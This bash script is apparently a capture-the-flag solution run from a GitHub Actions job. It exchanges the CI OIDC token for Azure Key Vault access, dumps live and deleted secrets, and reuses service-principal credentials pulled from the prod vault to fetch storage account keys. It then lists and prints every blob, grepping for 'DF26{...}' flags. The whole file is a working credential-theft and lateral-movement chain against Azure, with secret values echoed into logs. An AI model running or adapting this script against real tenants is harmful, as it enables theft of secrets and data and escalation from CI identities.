#!/usr/bin/env bash
# CTF DF26 v5: explore kv-tbl-sec-x3euoz with CI federated identity + sweep all SAs w/ fresh SP keys.
set +e
T=$AZURE_TENANT_ID; C=$AZURE_CLIENT_ID; S=$AZURE_SUBSCRIPTION_ID
M=https://management.azure.com
API_SA=2023-01-01
FL='DF26\{[^}]\{0,200}\}'
SAS="sttblreportprod8s42x5 sttblappcfgprodx3euoz sttblarchiveprodx3euoz sttblbackupprodx3euoz sttblcilogsprodx3euoz"
RGS="rg-tbl-platform-prod-sea rg-tbl-reporting-prod-eus"

OIDC=$(curl -s "$ACTIONS_ID_TOKEN_REQUEST_URL&audience=api://AzureADTokenExchange" \
  -H "Authorization: bearer $ACTIONS_ID_TOKEN_REQUEST_TOKEN" | jq -r .value)
fed(){ curl -s -X POST "https://login.microsoftonline.com/$T/oauth2/v2.0/token" \
  --data-urlencode grant_type=client_credentials --data-urlencode "client_id=$1" \
  --data-urlencode client_assertion_type=urn:ietf:params:oauth:client-assertion-type:jwt-bearer \
  --data-urlencode "client_assertion=$OIDC" --data-urlencode "scope=$2" | jq -r '.access_token // empty'; }
spn(){ curl -s -X POST "https://login.microsoftonline.com/$T/oauth2/v2.0/token" \
  --data-urlencode grant_type=client_credentials --data-urlencode "client_id=$1" \
  --data-urlencode "client_secret=$2" --data-urlencode "scope=$3" | jq -r '.access_token // empty'; }
D(){ date -u +"%a, %d %b %Y %H:%M:%S GMT"; }

echo "===== CTX run=$GITHUB_RUN_ID ====="
VT=$(fed "$C" "https://vault.azure.net/.default")

for VAULT in kv-tbl-sec-x3euoz kv-tbl-prod-x3euoz; do
  KV=https://$VAULT.vault.azure.net
  echo "########## VAULT $VAULT ##########"
  L1=$(curl -s "$KV/secrets?api-version=7.4" -H "Authorization: Bearer $VT")
  echo "$L1" | head -c 1500; echo
  for u in $(echo "$L1" | jq -r '.value[]?.id // empty'); do
    echo "----- $VAULT $(basename "$u")"
    v=$(curl -s "$u?api-version=7.4" -H "Authorization: Bearer $VT")
    echo "$v" | jq -r '.value // .' | head -c 700; echo
    echo "$v" | grep -aoE "$FL"
  done
  L2=$(curl -s "$KV/deleted-secrets?api-version=7.4" -H "Authorization: Bearer $VT")
  echo "-- deleted:"; echo "$L2" | jq -r '.value[]?.id // empty' | head -20
  for u in $(echo "$L2" | jq -r '.value[]?.id // empty'); do
    echo "----- DEL $u"
    curl -s "$u?api-version=7.4" -H "Authorization: Bearer $VT" | jq -r '.value // .' | head -c 700; echo
  done
done

# fresh SP creds from prod vault, then keys for every SA
PV=https://kv-tbl-prod-x3euoz.vault.azure.net
SECS=$(curl -s "$PV/secrets?api-version=7.4" -H "Authorization: Bearer $VT" | jq -r '.value[].id')
for u in $SECS; do
  w=$(curl -s "$u?api-version=7.4" -H "Authorization: Bearer $VT" | jq -r '.value // empty')
  aid=$(echo "$w" | jq -r '.appId // empty'); as=$(echo "$w" | jq -r '.clientSecret // empty')
  [ -z "$aid" ] && continue; [ -z "$as" ] && continue
  ARM=$(spn "$aid" "$as" "https://management.azure.com/.default")
  [ ${#ARM} -lt 50 ] && { echo "SP $(basename "$u") dead"; continue; }
  nm=$(basename "$u")
  P(){ curl -s -X POST -H "Authorization: Bearer $ARM" -H 'Content-Length: 0' "$1"; }
  for rg in $RGS; do for sa in $SAS; do
    KEY=$(P "$M/subscriptions/$S/resourceGroups/$rg/providers/Microsoft.Storage/storageAccounts/$sa/listKeys?api-version=$API_SA" | jq -r '.keys[0].value // empty')
    [ -n "$KEY" ] || continue
    echo "########## KEY $sa via $nm ($rg)"
    ka(){ local d; d=$(date -u +"%a, %d %b %Y %H:%M:%S GMT"); curl -s "$1" -H 'x-ms-version: 2021-08-06' -H "x-ms-date: $d" -H "Authorization: SharedKey $sa:$KEY"; }
    for cont in $(ka "https://$sa.blob.core.windows.net/?comp=list" | grep -oE '<Container><Name>[^<]+' | sed 's/.*<Name>//'); do
      echo "CONT $cont"
      for blob in $(ka "https://$sa.blob.core.windows.net/$cont?restype=container&comp=list" | grep -oE '<Blob><Name>[^<]+' | sed 's/.*<Name>//'); do
        echo "BLOB $cont/$blob"
        data=$(ka "https://$sa.blob.core.windows.net/$cont/$blob")
        echo "$data" | head -c 900; echo
        echo "$data" | grep -aoE "$FL"
      done
    done
  done; done
done
echo DONE-V5
